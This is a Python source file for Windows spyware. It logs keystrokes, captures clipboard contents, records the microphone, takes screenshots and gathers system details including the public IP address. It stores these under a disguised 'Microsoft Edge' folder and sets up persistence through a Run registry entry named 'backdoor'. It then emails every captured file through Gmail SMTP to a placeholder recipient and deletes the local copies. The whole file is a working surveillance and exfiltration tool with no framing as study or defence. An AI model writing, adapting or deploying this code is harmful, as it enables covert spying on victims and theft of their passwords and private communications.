from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
import win32clipboard
import pynput.keyboard
import sys
import time
import os
from scipy.io.wavfile import write
import sounddevice as sd
from cryptography.fernet import Fernet
import getpass
from requests import get
from multiprocessing import Process, freeze_support
from PIL import ImageGrab
import threading
import shutil
import subprocess

#os.environ["appdata"]
loc = os.environ["appdata"] + "\\Microsoft Edge"
if not os.path.exists(loc):
	os.mkdir(loc)
key_file_path = str(loc) + "\\keylog.txt"
sys_file_path = str(loc) + "\\sys_info.txt"
clp_file_path = str(loc) + "\\clip_info.txt"
rec_file_path = str(loc) + "\\rec_info("
pic_file_path = str(loc) + "\\pic_info("

email_add = "abc@gmail.com" # your email address
passwo = "password" # Password

toaddrecv = "xyz@gmail.com" # send data to email
count = 0
keys = []

def send_email(filename, attachment, toaddr):
	fromaddr = email_add
	msg = MIMEMultipart()
	msg['From'] = fromaddr
	msg['To'] = toaddr
	msg['Subject'] = "Log File"
	body = "Body_of_the_mail"
	msg.attach(MIMEText(body, 'plain'))
	filename = filename
	attachment = open(attachment, 'rb')
	p = MIMEBase('application', 'octet-stream')
	p.set_payload((attachment).read())
	encoders.encode_base64(p)
	p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
	msg.attach(p)
	s = smtplib.SMTP('smtp.gmail.com', 587)
	s.starttls()
	s.login(fromaddr, passwo)
	text = msg.as_string()
	s.sendmail(fromaddr, toaddr, text)
	s.quit()

def pc_info():
	with open(sys_file_path , "a") as f :
		hostname = socket.gethostname()
		IPArr = socket.gethostbyname(hostname)
		try :
			public_ip = get("https://api.ipify.org").text
			f.write("Public IP Adress: " + public_ip)
		except Exception :
			f.write("Couldn't get Public IP Address (most likely max query)")

		f.write("\nProcessor : " + (platform.processor()) + "\n")
		f.write("System : " + platform.system() + " " + platform.version() + "\n")
		f.write("Machine : " + platform.machine() + "\n")
		f.write("Hostname : " + hostname + "\n")
		f.write("Private IP : " + IPArr + "\n")


def clipbfun():
	while True:
		with open(clp_file_path,"a") as f :
			try:
				win32clipboard.OpenClipboard()
				paste_data = win32clipboard.GetClipboardData()
				win32clipboard.CloseClipboard()
				f.write ("\n" + paste_data)

			except :
				f.write("Unable to copydata")
		time.sleep(20)

def microrec():
	while True:
		fs = 44100
		secs = 20
		myrec = sd.rec(int(secs * fs) , samplerate  = fs, channels = 2)
		sd.wait()
		write(rec_file_path + time.strftime("%Y" +"-" +"%m"+"-"+ "%d"+"(" + "%H" + "_" + "%M" + "_" +"%S" +"))" + ".wav") , fs , myrec)
		time.sleep(20)

def screenshot():
	while True:
		im = ImageGrab.grab()
		im.save(pic_file_path + time.strftime("%Y" +"-" +"%m"+"-"+ "%d"+"(" + "%H" + "_" + "%M" + "_" +"%S" +"))" + ".png"))
		time.sleep(20)

def keylog():
	def on_press(key) :
		global keys, count
#		print(key)
		keys.append(key)
		count += 1

		if count >= 1 :
			count = 0
			write_file(keys)
			keys = []

	def write_file(keys) :
		with open(key_file_path , "a" ) as f :
			for key in keys :
				k = str(key).replace("'", "")
				if k.find("Key") != -1 :
					k = "(" + k + ")"
				f.write(k)
				f.close()

	def on_release(key) :
		if key == pynput.keyboard.Key.esc :
			return False

	with pynput.keyboard.Listener(on_press = on_press, on_release = on_release) as listener :
		listener.join()

location = os.environ["appdata"] + "\\microsoft.exe"
if not os.path.exists(location):
	shutil.copyfile(sys.executable, location)
	subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_SZ /d "' + location + '"',shell = True)


t1 = threading.Thread(target=microrec)
t2 = threading.Thread(target=screenshot)
t3 = threading.Thread(target=clipbfun)
t4 = threading.Thread(target=keylog)
t1.start()
t2.start()
t3.start()
t4.start()
pc_info()
#t1.join()
#t2.join()
#t3.join()
time.sleep(20)
while True:
	try:
		import os, re, os.path
		for root, dirs, files in os.walk(loc):
			for file in files:
				send_email(os.path.join(root, file),os.path.join(root, file) , toaddrecv)
				time.sleep(5)
				os.remove(os.path.join(root, file))
	except:
		continue

#import schedule
#import time
#def job(t):
#	print "I'm working...", t
#	return
#schedule.every().day.at("01:00").do(job,'It is 01:00')
#while True:
#	schedule.run_pending()
#	time.sleep(60) # wait one minute
